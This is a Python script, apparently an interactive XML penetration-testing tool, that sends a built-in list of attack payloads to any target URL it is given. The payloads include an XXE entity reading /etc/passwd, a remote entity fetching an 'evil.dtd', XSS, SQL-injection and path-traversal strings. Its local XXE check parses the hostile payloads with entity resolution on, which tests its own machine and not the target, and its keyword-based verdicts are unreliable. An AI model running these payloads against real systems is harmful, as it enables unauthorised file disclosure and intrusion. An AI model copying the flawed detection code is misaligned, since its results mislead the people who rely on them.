import requests
from lxml import etree
import os
import sys
from colorama import Fore, Style, init

init(autoreset=True)

# Default payloads for testing
DEFAULT_PAYLOADS = [
    '<root><data>&xxe;</data></root>',  # Basic XXE Payload
    '<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><root>&xxe;</root>',  # File Disclosure
    '<root><data>1 OR 1=1</data></root>',  # SQL Injection-like payload
    '<root><data><![CDATA[<malicious>payload</malicious>]]></data></root>',  # CDATA Payload
    '<root><data>&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;</data></root>',  # XSS Payload
    '<!DOCTYPE root [ <!ENTITY test SYSTEM "http://example.com/evil.dtd"> ]><root>&test;</root>',  # Remote Entity Injection
    '<root><data>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</data></root>',  # Script Injection
    '<root><data>../../../../../etc/passwd</data></root>',  # Path Traversal
    '<root><data>SELECT * FROM users WHERE username=\'admin\'--</data></root>',  # SQL Injection Payload
    '<root><data>&lt;iframe src="javascript:alert(1)"&gt;</data></root>',  # iframe Injection
]

def load_custom_payloads():
    file_path = input("Enter the full path to the custom payload file: ").strip()
    if not os.path.isfile(file_path):
        print(f"{Fore.RED}‚ùå Error: Payload file does not exist!")
        return None

    with open(file_path, 'r') as file:
        payloads = file.read().splitlines()  # Load payloads, one per line
    print(f"{Fore.GREEN}‚úÖ Successfully loaded custom payloads.")
    return payloads

def check_well_formedness(xml):
    try:
        etree.fromstring(xml)
        return True
    except etree.XMLSyntaxError as e:
        return f"Malformed XML: {e}"

def test_xxe(payload):
    try:
        parser = etree.XMLParser(load_dtd=True, resolve_entities=True)
        etree.fromstring(payload, parser)
        return True  # Indicates XXE potential
    except Exception as e:
        return False  # No vulnerability detected

def send_payload(target_url, headers, payload):
    try:
        response = requests.post(target_url, data=payload, headers=headers, timeout=5)
        return response
    except Exception as e:
        return f"Error sending payload: {e}"

def display_poc(payload, response, vulnerability_type):
    print(f"\n{Fore.RED}[VULNERABLE] {vulnerability_type} Detected!")
    print(f"{Fore.YELLOW}  Payload Used:\n{payload}")
    print(f"{Fore.CYAN}  Server Response:")
    print(f"    Status Code: {response.status_code}")
    print(f"    Headers: {response.headers}")
    print(f"    Body: {response.text[:300]}...")  # Truncate long responses for readability


def test_xml(target, target_type, payloads):
    print(f"{Fore.CYAN}üîç Starting Penetration Testing for Target: {target_type} - {target}")

    headers = {"Content-Type": "application/xml"}
    for i, payload in enumerate(payloads, start=1):
        print(f"\n{Fore.YELLOW}[Payload {i}] Testing with payload:\n{payload}\n")

        # Step 1: Test well-formedness
        well_formed = check_well_formedness(payload)
        if well_formed is True:
            print(f"  {Fore.GREEN}Well-formedness Check: Passed")
        else:
            print(f"  {Fore.RED}Well-formedness Check: {well_formed}")

        # Step 2: Test for XXE vulnerability
        xxe_result = test_xxe(payload)
        if xxe_result:
            print(f"  {Fore.RED}XXE Test Result: Vulnerable!")
        else:
            print(f"  {Fore.GREEN}XXE Test Result: Safe")

        # Step 3: Send payload to target URL
        if target_type == "URL":
            response = send_payload(target, headers, payload)
            if isinstance(response, str):
                print(f"  {Fore.RED}Error: {response}")
            else:
                print(f"  {Fore.BLUE}Server Response: {response.status_code}")

                # Check for signs of vulnerability in the response
                if "passwd" in response.text or "malicious" in response.text:
                    display_poc(payload, response, "XXE/File Disclosure")
                elif "alert(1)" in response.text or "script" in response.text:
                    display_poc(payload, response, "XSS")
                elif "1=1" in response.text:
                    display_poc(payload, response, "SQL Injection")
                else:
                    print(f"  {Fore.GREEN}No vulnerability detected in server response.")

        print("-" * 50)

    print(f"\n{Fore.CYAN}‚úÖ Testing Completed!")


def load_xml_file():
    file_path = input("Enter the full path to the XML file: ").strip()
    if not os.path.isfile(file_path):
        print(f"{Fore.RED}‚ùå Error: File does not exist!")
        return None

    with open(file_path, 'r') as file:
        content = file.read()
    print(f"{Fore.GREEN}‚úÖ Successfully loaded XML file.")
    return content


def main_menu():
    while True:
        print(f"\n{Fore.CYAN}Welcome to XML Penetration Testing Tool By Malik Hamza! üöÄ")
        print("\nChoose input type:")
        print("1. Load XML from a file")
        print("2. Test a URL endpoint")
        print("3. Exit the tool")
        choice = input("Enter your choice (1, 2, or 3): ").strip()

        if choice == "1" or choice == "2":
            # Load target based on user input
            if choice == "1":
                target = load_xml_file()
                target_type = "File"
            else:
                target = input("Enter the target URL for testing: ").strip()
                target_type = "URL"

            if target:
                print("\nChoose payload type:")
                print("1. Use default payloads")
                print("2. Use custom payloads from a file")
                payload_choice = input("Enter your choice (1 or 2): ").strip()

                if payload_choice == "1":
                    payloads = DEFAULT_PAYLOADS
                elif payload_choice == "2":
                    payloads = load_custom_payloads()
                    if not payloads:
                        continue  # Go back to main menu if custom payloads fail to load
                else:
                    print(f"{Fore.RED}‚ùå Invalid choice for payload type!")
                    continue

                test_xml(target, target_type, payloads)
        elif choice == "3":
            print(f"{Fore.GREEN}Exiting the tool. Goodbye!")
            sys.exit(0)
        else:
            print(f"{Fore.RED}‚ùå Invalid choice! Please select 1, 2, or 3.")

if __name__ == "__main__":
    main_menu()
